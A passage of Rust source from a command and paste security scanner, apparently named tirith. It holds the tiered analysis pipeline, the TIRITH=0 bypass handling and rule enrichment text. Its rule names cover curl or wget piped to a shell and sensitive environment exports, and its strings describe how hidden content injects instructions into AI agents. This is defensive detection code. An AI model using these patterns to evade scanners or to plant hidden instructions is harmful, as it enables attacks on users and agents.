use std::time::Instant;

use crate::extract::{self, ScanContext};
use crate::normalize;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Finding, Timings, Verdict};

/// Extract the raw path from a URL string before any normalization.
fn extract_raw_path_from_url(raw: &str) -> Option<String> {
    if let Some(idx) = raw.find("://") {
        let after = &raw[idx + 3..];
        if let Some(slash_idx) = after.find('/') {
            // Find end of path (before ? or #)
            let path_start = &after[slash_idx..];
            let end = path_start.find(['?', '#']).unwrap_or(path_start.len());
            return Some(path_start[..end].to_string());
        }
    }
    None
}

/// Analysis context passed through the pipeline.
pub struct AnalysisContext {
    pub input: String,
    pub shell: ShellType,
    pub scan_context: ScanContext,
    pub raw_bytes: Option<Vec<u8>>,
    pub interactive: bool,
    pub cwd: Option<String>,
    /// File path being scanned (only populated for ScanContext::FileScan).
    pub file_path: Option<std::path::PathBuf>,
    /// Clipboard HTML content for rich-text paste analysis.
    /// Only populated when `tirith paste --html <path>` is used.
    pub clipboard_html: Option<String>,
}

/// Check if the input contains an inline `TIRITH=0` bypass prefix.
/// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
    use crate::tokenize;

    let words = split_raw_words(input);
    if words.is_empty() {
        return false;
    }

    // Case 1: Leading VAR=VALUE assignments before the command
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        if words[idx].starts_with("TIRITH=0") || words[idx] == "TIRITH=0" {
            return true;
        }
        idx += 1;
    }

    // Case 2: First real word is `env` — parse env-style args
    if idx < words.len() {
        let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
        if cmd == "env" {
            idx += 1;
            while idx < words.len() {
                let w = &words[idx];
                if w == "--" {
                    idx += 1;
                    // After --, remaining are VAR=VALUE or command
                    break;
                }
                if tokenize::is_env_assignment(w) {
                    if w.starts_with("TIRITH=0") || w == "TIRITH=0" {
                        return true;
                    }
                    idx += 1;
                    continue;
                }
                if w.starts_with('-') {
                    if w == "-u" || w == "-C" || w == "-S" {
                        idx += 2; // skip option and its value arg
                        continue;
                    }
                    idx += 1;
                    continue;
                }
                // Non-flag, non-assignment = the command, stop
                break;
            }
            // Check remaining words after -- for TIRITH=0
            while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                if words[idx].starts_with("TIRITH=0") || words[idx] == "TIRITH=0" {
                    return true;
                }
                idx += 1;
            }
        }
    }

    false
}

/// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
/// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
/// the raw input to inspect the first segment's words.
fn split_raw_words(input: &str) -> Vec<String> {
    // Take only up to the first unquoted pipe/semicolon/&&/||
    let mut words = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            ' ' | '\t' if !current.is_empty() => {
                words.push(current.clone());
                current.clear();
                i += 1;
                while i < len && (chars[i] == ' ' || chars[i] == '\t') {
                    i += 1;
                }
            }
            ' ' | '\t' => {
                i += 1;
            }
            '|' | ';' | '\n' => break, // Stop at segment boundary
            '&' if i + 1 < len && chars[i + 1] == '&' => break,
            '\'' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '\\' if i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                i += 2;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Check if the input is a self-invocation of tirith (single-segment only).
/// Returns true if the resolved command is `tirith` itself.
fn is_self_invocation(input: &str, shell: ShellType) -> bool {
    use crate::tokenize;

    // Must be single segment (no pipes, &&, etc.)
    let segments = tokenize::tokenize(input, shell);
    if segments.len() != 1 {
        return false;
    }

    let words = split_raw_words(input);
    if words.is_empty() {
        return false;
    }

    // Skip leading VAR=VALUE
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        idx += 1;
    }
    if idx >= words.len() {
        return false;
    }

    let cmd = &words[idx];
    let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);

    // Try to resolve wrappers (one level)
    let resolved = match cmd_base {
        "env" => resolve_env_wrapper(&words[idx + 1..]),
        "command" => resolve_command_wrapper(&words[idx + 1..]),
        "time" => resolve_time_wrapper(&words[idx + 1..]),
        other => Some(other.to_string()),
    };

    match resolved {
        Some(ref cmd_name) => is_tirith_command(cmd_name),
        None => false,
    }
}

/// Resolve through `env` wrapper: skip options, VAR=VALUE, find command.
fn resolve_env_wrapper(args: &[String]) -> Option<String> {
    use crate::tokenize;
    let mut i = 0;
    while i < args.len() {
        let w = &args[i];
        if w == "--" {
            i += 1;
            break;
        }
        if tokenize::is_env_assignment(w) {
            i += 1;
            continue;
        }
        if w.starts_with('-') {
            if w == "-u" || w == "-C" || w == "-S" {
                i += 2; // skip option and its value arg
                continue;
            }
            i += 1;
            continue;
        }
        // First non-option, non-assignment is the command
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    // After --, skip remaining VAR=VALUE to find command
    while i < args.len() {
        let w = &args[i];
        if tokenize::is_env_assignment(w) {
            i += 1;
            continue;
        }
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    None
}

/// Resolve through `command` wrapper: skip `--`, take next arg.
fn resolve_command_wrapper(args: &[String]) -> Option<String> {
    let mut i = 0;
    // Skip -- if present
    if i < args.len() && args[i] == "--" {
        i += 1;
    }
    if i < args.len() {
        let w = &args[i];
        Some(w.rsplit('/').next().unwrap_or(w).to_string())
    } else {
        None
    }
}

/// Resolve through `time` wrapper: skip -prefixed flags, take next non-flag.
fn resolve_time_wrapper(args: &[String]) -> Option<String> {
    for w in args {
        if w.starts_with('-') {
            continue;
        }
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    None
}

/// Check if a command name is tirith (literal or path match).
fn is_tirith_command(cmd: &str) -> bool {
    if cmd == "tirith" {
        return true;
    }
    // Path form: try canonicalize and compare to current_exe
    if cmd.contains('/') {
        let cmd_path = std::path::Path::new(cmd);
        if let Ok(canonical_cmd) = cmd_path.canonicalize() {
            if let Ok(current) = std::env::current_exe() {
                if let Ok(canonical_current) = current.canonicalize() {
                    return canonical_cmd == canonical_current;
                }
            }
        }
        // Canonicalization failed — don't auto-allow, return false
        return false;
    }
    false
}

/// Run the tiered analysis pipeline.
pub fn analyze(ctx: &AnalysisContext) -> Verdict {
    let start = Instant::now();

    // Tier 0: Check bypass flag
    let tier0_start = Instant::now();
    let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let bypass_inline = find_inline_bypass(&ctx.input, ctx.shell);
    let bypass_requested = bypass_env || bypass_inline;
    let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 1: Fast scan (no I/O)
    let tier1_start = Instant::now();

    // Step 1 (paste only): byte-level scan for control chars
    let byte_scan_triggered = if ctx.scan_context == ScanContext::Paste {
        if let Some(ref bytes) = ctx.raw_bytes {
            let scan = extract::scan_bytes(bytes);
            scan.has_ansi_escapes
                || scan.has_control_chars
                || scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_invalid_utf8
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
        } else {
            false
        }
    } else {
        false
    };

    // Step 2: URL-like regex scan
    let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);

    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs
    let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
        let scan = extract::scan_bytes(ctx.input.as_bytes());
        scan.has_bidi_controls
            || scan.has_zero_width
            || scan.has_unicode_tags
            || scan.has_variation_selectors
            || scan.has_invisible_math_operators
            || scan.has_invisible_whitespace
    } else {
        false
    };

    let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;

    // If nothing triggered, fast exit
    if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return Verdict::allow_fast(
            1,
            Timings {
                tier0_ms,
                tier1_ms,
                tier2_ms: None,
                tier3_ms: None,
                total_ms,
            },
        );
    }

    // Self-invocation guard: allow tirith's own commands (single-segment only)
    if ctx.scan_context == ScanContext::Exec && is_self_invocation(&ctx.input, ctx.shell) {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return Verdict::allow_fast(
            1,
            Timings {
                tier0_ms,
                tier1_ms,
                tier2_ms: None,
                tier3_ms: None,
                total_ms,
            },
        );
    }

    // Tier 2: Policy + data loading (deferred I/O)
    let tier2_start = Instant::now();

    if bypass_requested {
        // Load partial policy to check bypass settings
        let policy = Policy::discover_partial(ctx.cwd.as_deref());
        let allow_bypass = if ctx.interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };

        if allow_bypass {
            let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;
            let total_ms = start.elapsed().as_secs_f64() * 1000.0;
            let mut verdict = Verdict::allow_fast(
                2,
                Timings {
                    tier0_ms,
                    tier1_ms,
                    tier2_ms: Some(tier2_ms),
                    tier3_ms: None,
                    total_ms,
                },
            );
            verdict.bypass_requested = true;
            verdict.bypass_honored = true;
            verdict.interactive_detected = ctx.interactive;
            verdict.policy_path_used = policy.path.clone();
            // Log bypass to audit
            crate::audit::log_verdict(&verdict, &ctx.input, None, None);
            return verdict;
        }
    }

    let mut policy = Policy::discover(ctx.cwd.as_deref());
    policy.load_user_lists();
    policy.load_org_lists(ctx.cwd.as_deref());
    let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 3: Full analysis
    let tier3_start = Instant::now();
    let mut findings = Vec::new();

    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
    let mut extracted = Vec::new();

    if ctx.scan_context == ScanContext::FileScan {
        // FileScan: byte scan + configfile rules ONLY.
        // Does NOT run command/env/URL-extraction rules.
        let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
            bytes.as_slice()
        } else {
            ctx.input.as_bytes()
        };
        let byte_findings = crate::rules::terminal::check_bytes(byte_input);
        findings.extend(byte_findings);

        // Config file detection rules
        findings.extend(crate::rules::configfile::check(
            &ctx.input,
            ctx.file_path.as_deref(),
        ));

        // Rendered content rules (file-type gated)
        if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
            // PDF files get their own parser
            let is_pdf = ctx
                .file_path
                .as_deref()
                .and_then(|p| p.extension())
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

            if is_pdf {
                let pdf_bytes = ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes());
                findings.extend(crate::rules::rendered::check_pdf(pdf_bytes));
            } else {
                findings.extend(crate::rules::rendered::check(
                    &ctx.input,
                    ctx.file_path.as_deref(),
                ));
            }
        }
    } else {
        // Exec/Paste: standard pipeline

        // Run byte-level rules for paste context
        if ctx.scan_context == ScanContext::Paste {
            if let Some(ref bytes) = ctx.raw_bytes {
                let byte_findings = crate::rules::terminal::check_bytes(bytes);
                findings.extend(byte_findings);
            }
            // Check for hidden multiline content in pasted text
            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
            findings.extend(multiline_findings);

            // Check clipboard HTML for hidden content (rich-text paste analysis)
            if let Some(ref html) = ctx.clipboard_html {
                let clipboard_findings =
                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
                findings.extend(clipboard_findings);
            }
        }

        // Invisible character checks apply to both exec and paste contexts
        if ctx.scan_context == ScanContext::Exec {
            let byte_input = ctx.input.as_bytes();
            let scan = extract::scan_bytes(byte_input);
            if scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
            {
                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
                // Only keep invisible-char findings for exec context
                findings.extend(byte_findings.into_iter().filter(|f| {
                    matches!(
                        f.rule_id,
                        crate::verdict::RuleId::BidiControls
                            | crate::verdict::RuleId::ZeroWidthChars
                            | crate::verdict::RuleId::UnicodeTags
                            | crate::verdict::RuleId::InvisibleMathOperator
                            | crate::verdict::RuleId::VariationSelector
                            | crate::verdict::RuleId::InvisibleWhitespace
                    )
                }));
            }
        }

        // Extract and analyze URLs
        extracted = extract::extract_urls(&ctx.input, ctx.shell);

        for url_info in &extracted {
            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
            // since url::Url percent-encodes non-ASCII during parsing
            let raw_path = extract_raw_path_from_url(&url_info.raw);
            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);

            // Run all rule categories
            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
            findings.extend(hostname_findings);

            let path_findings = crate::rules::path::check(
                &url_info.parsed,
                normalized_path.as_ref(),
                raw_path.as_deref(),
            );
            findings.extend(path_findings);

            let transport_findings =
                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
            findings.extend(transport_findings);

            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
            findings.extend(ecosystem_findings);
        }

        // Run command-shape rules on full input
        let command_findings = crate::rules::command::check(&ctx.input, ctx.shell);
        findings.extend(command_findings);

        // Run environment rules
        let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
        findings.extend(env_findings);
    }

    // Apply policy severity overrides
    for finding in &mut findings {
        if let Some(override_sev) = policy.severity_override(&finding.rule_id) {
            finding.severity = override_sev;
        }
    }

    // Filter by allowlist/blocklist
    // Blocklist: if any extracted URL matches blocklist, escalate to Block
    for url_info in &extracted {
        if policy.is_blocklisted(&url_info.raw) {
            findings.push(Finding {
                rule_id: crate::verdict::RuleId::PolicyBlocklisted,
                severity: crate::verdict::Severity::Critical,
                title: "URL matches blocklist".to_string(),
                description: format!("URL '{}' matches a blocklist pattern", url_info.raw),
                evidence: vec![crate::verdict::Evidence::Url {
                    raw: url_info.raw.clone(),
                }],
                human_view: None,
                agent_view: None,
            });
        }
    }

    // Allowlist: remove findings for URLs that match allowlist
    // (blocklist takes precedence — if blocklisted, findings remain)
    if !policy.allowlist.is_empty() {
        let blocklisted_urls: Vec<String> = extracted
            .iter()
            .filter(|u| policy.is_blocklisted(&u.raw))
            .map(|u| u.raw.clone())
            .collect();

        findings.retain(|f| {
            // Keep all findings that aren't URL-based
            let url_in_evidence = f.evidence.iter().find_map(|e| {
                if let crate::verdict::Evidence::Url { raw } = e {
                    Some(raw.clone())
                } else {
                    None
                }
            });
            match url_in_evidence {
                Some(ref url) => {
                    // Keep if blocklisted, otherwise drop if allowlisted
                    blocklisted_urls.contains(url) || !policy.is_allowlisted(url)
                }
                None => true, // Keep non-URL findings
            }
        });
    }

    // Enrichment pass (ADR-13): detection is free, enrichment is paid.
    // All detection rules have already run above. Now add tier-gated enrichment.
    let tier = crate::license::current_tier();
    if tier >= crate::license::Tier::Pro {
        enrich_pro(&mut findings);
    }
    if tier >= crate::license::Tier::Team {
        enrich_team(&mut findings);
    }

    // Early access filter (ADR-14): suppress non-critical findings for rules
    // in time-boxed early access windows when tier is below the minimum.
    crate::rule_metadata::filter_early_access(&mut findings, tier);

    let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
    let total_ms = start.elapsed().as_secs_f64() * 1000.0;

    let mut verdict = Verdict::from_findings(
        findings,
        3,
        Timings {
            tier0_ms,
            tier1_ms,
            tier2_ms: Some(tier2_ms),
            tier3_ms: Some(tier3_ms),
            total_ms,
        },
    );
    verdict.bypass_requested = bypass_requested;
    verdict.interactive_detected = ctx.interactive;
    verdict.policy_path_used = policy.path.clone();
    verdict.urls_extracted_count = Some(extracted.len());

    verdict
}

// ---------------------------------------------------------------------------
// Paranoia tier filtering (Phase 15)
// ---------------------------------------------------------------------------

/// Filter a verdict's findings by paranoia level and license tier.
///
/// This is an output-layer filter — the engine always detects everything (ADR-13).
/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
///
/// - Paranoia 1-2 (any tier): Medium+ findings only
/// - Paranoia 3 (Pro required): also show Low findings
/// - Paranoia 4 (Pro required): also show Info findings
///
/// Free-tier users are capped at effective paranoia 2 regardless of policy setting.
pub fn filter_findings_by_paranoia(verdict: &mut Verdict, paranoia: u8) {
    let tier = crate::license::current_tier();
    let effective = if tier >= crate::license::Tier::Pro {
        paranoia.min(4)
    } else {
        paranoia.min(2) // Free users capped at 2
    };

    verdict.findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true, // Medium/High/Critical always shown
    });

    // Recalculate action after filtering
    if verdict.findings.is_empty() {
        verdict.action = crate::verdict::Action::Allow;
    } else if let Some(max_sev) = verdict.findings.iter().map(|f| f.severity).max() {
        verdict.action = match max_sev {
            crate::verdict::Severity::Critical | crate::verdict::Severity::High => {
                crate::verdict::Action::Block
            }
            crate::verdict::Severity::Medium | crate::verdict::Severity::Low => {
                crate::verdict::Action::Warn
            }
            crate::verdict::Severity::Info => crate::verdict::Action::Allow,
        };
    }
}

/// Filter a Vec<Finding> by paranoia level and license tier.
/// Same logic as `filter_findings_by_paranoia` but operates on raw findings
/// (for scan results that don't use the Verdict wrapper).
pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8) {
    let tier = crate::license::current_tier();
    let effective = if tier >= crate::license::Tier::Pro {
        paranoia.min(4)
    } else {
        paranoia.min(2)
    };

    findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true,
    });
}

// ---------------------------------------------------------------------------
// Tier-gated enrichment (ADR-13: detect free, enrich paid)
// ---------------------------------------------------------------------------

/// Sanitize view text by escaping control characters to bracketed notation.
///
/// Encoding:
///   literal `[` → `[LBRACK]`
///   ESC (0x1B) → `[ESC]`
///   Bidi (U+202A..U+202E, U+2066..U+2069) → `[U+XXXX]`
///   Zero-width (U+200B..U+200F, U+FEFF) → `[U+XXXX]`
///   Unicode Tags (U+E0001..U+E007F) → `[U+XXXXX]`
///   Control chars (0x00..0x1F except \n\r\t, 0x7F) → `[0xHH]`
///   Everything else → verbatim
///
/// Truncates to 512 bytes with `... [truncated, {N} bytes]` marker.
/// Trims incomplete markers (opening `[` without closing `]`) at truncation boundary.
fn sanitize_view(s: &str) -> String {
    // Total output cap including truncation marker. The marker itself is
    // at most ~30 bytes ("... [truncated, 999999 bytes]"), so we reserve
    // space for it to ensure the final output never exceeds MAX_BYTES.
    const MAX_BYTES: usize = 512;
    const MARKER_RESERVE: usize = 40; // enough for "... [truncated, {N} bytes]"
    let total = s.len();
    let full_len = sanitize_view_full_len(s);
    let needs_truncation = full_len > MAX_BYTES;
    let content_cap = if needs_truncation {
        MAX_BYTES.saturating_sub(MARKER_RESERVE)
    } else {
        MAX_BYTES
    };

    let mut out = String::with_capacity(std::cmp::min(total, MAX_BYTES) + 64);

    for ch in s.chars() {
        let escaped = match ch {
            '[' => "[LBRACK]".to_string(),
            '\x1B' => "[ESC]".to_string(),
            // Bidi controls
            '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' => {
                format!("[U+{:04X}]", ch as u32)
            }
            // Zero-width characters
            '\u{200B}'..='\u{200F}' | '\u{FEFF}' => format!("[U+{:04X}]", ch as u32),
            // Unicode Tags block
            '\u{E0001}'..='\u{E007F}' => format!("[U+{:05X}]", ch as u32),
            // Control chars (0x00..0x1F except \n \r \t, and 0x7F)
            c if (c as u32) < 0x20 && c != '\n' && c != '\r' && c != '\t' => {
                format!("[0x{:02X}]", c as u32)
            }
            '\x7F' => "[0x7F]".to_string(),
            c => {
                // Verbatim — check length before appending
                if out.len() + c.len_utf8() > content_cap {
                    break;
                }
                out.push(c);
                continue;
            }
        };

        if out.len() + escaped.len() > content_cap {
            break;
        }
        out.push_str(&escaped);
    }

    // If we truncated (didn't consume all chars), add marker
    if needs_truncation {
        // Trim any incomplete bracket marker at the end
        if let Some(last_open) = out.rfind('[') {
            if !out[last_open..].contains(']') {
                out.truncate(last_open);
            }
        }
        out.push_str(&format!("... [truncated, {total} bytes]"));
    }

    out
}

/// Calculate the full sanitized length (without truncation) to detect if truncation occurred.
fn sanitize_view_full_len(s: &str) -> usize {
    let mut len = 0usize;
    for ch in s.chars() {
        len += match ch {
            '[' => 8,                                               // [LBRACK]
            '\x1B' => 5,                                            // [ESC]
            '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' => 8, // [U+XXXX]
            '\u{200B}'..='\u{200F}' | '\u{FEFF}' => 8,
            '\u{E0001}'..='\u{E007F}' => 9, // [U+XXXXX]
            c if (c as u32) < 0x20 && c != '\n' && c != '\r' && c != '\t' => 6, // [0xHH]
            '\x7F' => 6,
            c => c.len_utf8(),
        };
    }
    len
}

/// Returns `true` if the given rule is enriched with human_view/agent_view in `enrich_pro`.
///
/// Uses an EXHAUSTIVE match — adding a new RuleId variant without listing it
/// here is a **compile error**, not just a test failure. Every variant must be
/// explicitly classified as enriched or not. No wildcard (`_ =>`) allowed.
#[cfg(test)]
#[deny(unreachable_patterns)]
fn classify_rule_enriched(rule_id: crate::verdict::RuleId) -> bool {
    use crate::verdict::RuleId::*;
    match rule_id {
        // === ENRICHED (must have human_view/agent_view) ===
        // Rendered content (existing 7)
        HiddenCssContent
        | HiddenColorContent
        | HiddenHtmlAttribute
        | HtmlComment
        | MarkdownComment
        | PdfHiddenText
        | ClipboardHidden
        // Terminal (7)
        | UnicodeTags
        | ZeroWidthChars
        | BidiControls
        | InvisibleMathOperator
        | VariationSelector
        | ControlChars
        | AnsiEscapes
        // Config (3)
        | ConfigInjection
        | ConfigInvisibleUnicode
        | ConfigNonAscii
        // MCP (2)
        | McpSuspiciousArgs
        | McpInsecureServer
        // Cloaking (1)
        | ServerCloaking => true,

        // === NON-ENRICHED (detection-only, no view gap) ===
        // Every non-enriched variant is listed explicitly here.
        // Adding a new variant WITHOUT listing it is a compile error.
        // Hostname
        NonAsciiHostname | PunycodeDomain | MixedScriptInLabel
        | UserinfoTrick | ConfusableDomain | RawIpUrl
        | NonStandardPort | InvalidHostChars | TrailingDotWhitespace
        | LookalikeTld
        // Path
        | NonAsciiPath | HomoglyphInPath | DoubleEncoding
        // Transport
        | PlainHttpToSink | SchemelessToSink | InsecureTlsFlags
        | ShortenedUrl
        // Terminal (non-enriched subset)
        | HiddenMultiline | InvisibleWhitespace
        // Command shape
        | PipeToInterpreter | CurlPipeShell | WgetPipeShell
        | HttpiePipeShell | XhPipeShell | DotfileOverwrite
        | ArchiveExtract
        // Environment
        | ProxyEnvSet | SensitiveEnvExport | CodeInjectionEnv
        | InterpreterHijackEnv | ShellInjectionEnv
        // Network destination
        | MetadataEndpoint | PrivateNetworkAccess | CommandNetworkDeny
        // Config (non-enriched subset)
        | McpUntrustedServer | McpDuplicateServerName | McpOverlyPermissive
        // Ecosystem
        | GitTyposquat | DockerUntrustedRegistry | PipUrlInstall
        | NpmUrlInstall | Web3RpcEndpoint | Web3AddressInUrl
        // Policy, License
        | PolicyBlocklisted | LicenseRequired => false,
    }
}

/// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
fn enrich_pro(findings: &mut [Finding]) {
    use crate::verdict::RuleId;

    for finding in findings.iter_mut() {
        match finding.rule_id {
            // ── Rendered content (existing 7) ──────────────────────────
            RuleId::HiddenCssContent => {
                finding.human_view =
                    Some("Content hidden via CSS — invisible in rendered view".into());
                finding.agent_view = Some(format!(
                    "AI agent sees full text including CSS-hidden content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::HiddenColorContent => {
                finding.human_view =
                    Some("Text blends with background — invisible to human eye".into());
                finding.agent_view = Some(format!(
                    "AI agent reads text regardless of color contrast. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::HiddenHtmlAttribute => {
                finding.human_view =
                    Some("Elements marked hidden/aria-hidden — not displayed".into());
                finding.agent_view = Some(format!(
                    "AI agent processes hidden element content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::HtmlComment => {
                finding.human_view = Some("HTML comments not rendered in browser".into());
                finding.agent_view = Some(format!(
                    "AI agent reads comment content as context. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::MarkdownComment => {
                finding.human_view = Some("Markdown comments not rendered in preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes markdown comment content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::PdfHiddenText => {
                finding.human_view = Some("Sub-pixel text invisible in PDF viewer".into());
                finding.agent_view = Some(format!(
                    "AI agent extracts all text including sub-pixel content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::ClipboardHidden => {
                finding.human_view =
                    Some("Hidden content in clipboard HTML not visible in paste preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes full clipboard including hidden HTML. {}",
                    evidence_summary(&finding.evidence)
                ));
            }

            // ── Terminal (7 new) ───────────────────────────────────────
            RuleId::UnicodeTags => {
                finding.human_view = Some("Invisible — tags render as zero-width".into());
                finding.agent_view = Some(format!(
                    "AI processes hidden tag-encoded text. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::ZeroWidthChars => {
                finding.human_view = Some("Invisible — zero-width chars have no glyph".into());
                finding.agent_view = Some(format!(
                    "AI tokenizes zero-width chars as content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::BidiControls => {
                finding.human_view = Some(format!(
                    "Text appears in reversed/misleading order. {}",
                    evidence_summary(&finding.evidence)
                ));
                finding.agent_view =
                    Some("AI reads logical character order, not visual display order".into());
            }
            RuleId::InvisibleMathOperator => {
                finding.human_view = Some("Invisible — math operators render as blank".into());
                finding.agent_view = Some(format!(
                    "AI processes invisible operators as tokens. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::VariationSelector => {
                finding.human_view = Some("Subtle glyph alteration — hard to spot visually".into());
                finding.agent_view = Some(format!(
                    "AI sees variation selector codepoints. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::ControlChars => {
                finding.human_view = Some("Control characters hidden from terminal display".into());
                finding.agent_view = Some(format!(
                    "AI processes raw control sequences. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::AnsiEscapes => {
                finding.human_view =
                    Some("ANSI escapes render as colors/formatting, hiding content".into());
                finding.agent_view = Some(format!(
                    "AI sees raw escape sequences as text. {}",
                    evidence_summary(&finding.evidence)
                ));
            }

            // ── Config (3 new) ─────────────────────────────────────────
            RuleId::ConfigInjection => {
                finding.human_view = Some("Injection blends with legitimate instructions".into());
                finding.agent_view = Some(format!(
                    "AI follows injected instructions as if authoritative. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::ConfigInvisibleUnicode => {
                finding.human_view = Some("Hidden chars invisible in editors/code review".into());
                finding.agent_view = Some(format!(
                    "AI processes hidden Unicode payload. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::ConfigNonAscii => {
                finding.human_view =
                    Some("Non-ASCII may look identical to ASCII in editors".into());
                finding.agent_view = Some(format!(
                    "AI processes different codepoints than expected. {}",
                    evidence_summary(&finding.evidence)
                ));
            }

            // ── MCP (2 new) ───────────────────────────────────────────
            RuleId::McpSuspiciousArgs => {
                finding.human_view =
                    Some("Shell metacharacters may be overlooked in JSON config".into());
                finding.agent_view = Some(format!(
                    "MCP server args contain shell injection. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            RuleId::McpInsecureServer => {
                finding.human_view =
                    Some("HTTP URL looks normal but traffic is unencrypted".into());
                finding.agent_view = Some(format!(
                    "MCP server uses insecure HTTP transport. {}",
                    evidence_summary(&finding.evidence)
                ));
            }

            // ── Cloaking (1 new) ──────────────────────────────────────
            RuleId::ServerCloaking => {
                finding.human_view = Some("Browser shows benign content to human visitors".into());
                finding.agent_view = Some(format!(
                    "AI bot receives different content via user-agent detection. {}",
                    evidence_summary(&finding.evidence)
                ));
            }

            // ── Non-enriched variants (explicit for compile-time safety) ──
            RuleId::NonAsciiHostname
            | RuleId::PunycodeDomain
            | RuleId::MixedScriptInLabel
            | RuleId::UserinfoTrick
            | RuleId::ConfusableDomain
            | RuleId::RawIpUrl
            | RuleId::NonStandardPort
            | RuleId::InvalidHostChars
            | RuleId::TrailingDotWhitespace
            | RuleId::LookalikeTld
            | RuleId::NonAsciiPath
            | RuleId::HomoglyphInPath
            | RuleId::DoubleEncoding
            | RuleId::PlainHttpToSink
            | RuleId::SchemelessToSink
            | RuleId::InsecureTlsFlags
            | RuleId::ShortenedUrl
            | RuleId::HiddenMultiline
            | RuleId::InvisibleWhitespace
            | RuleId::PipeToInterpreter
            | RuleId::CurlPipeShell
            | RuleId::WgetPipeShell
            | RuleId::HttpiePipeShell
            | RuleId::XhPipeShell
            | RuleId::DotfileOverwrite
            | RuleId::ArchiveExtract
            | RuleId::ProxyEnvSet
            | RuleId::SensitiveEnvExport
            | RuleId::CodeInjectionEnv
            | RuleId::InterpreterHijackEnv
            | RuleId::ShellInjectionEnv
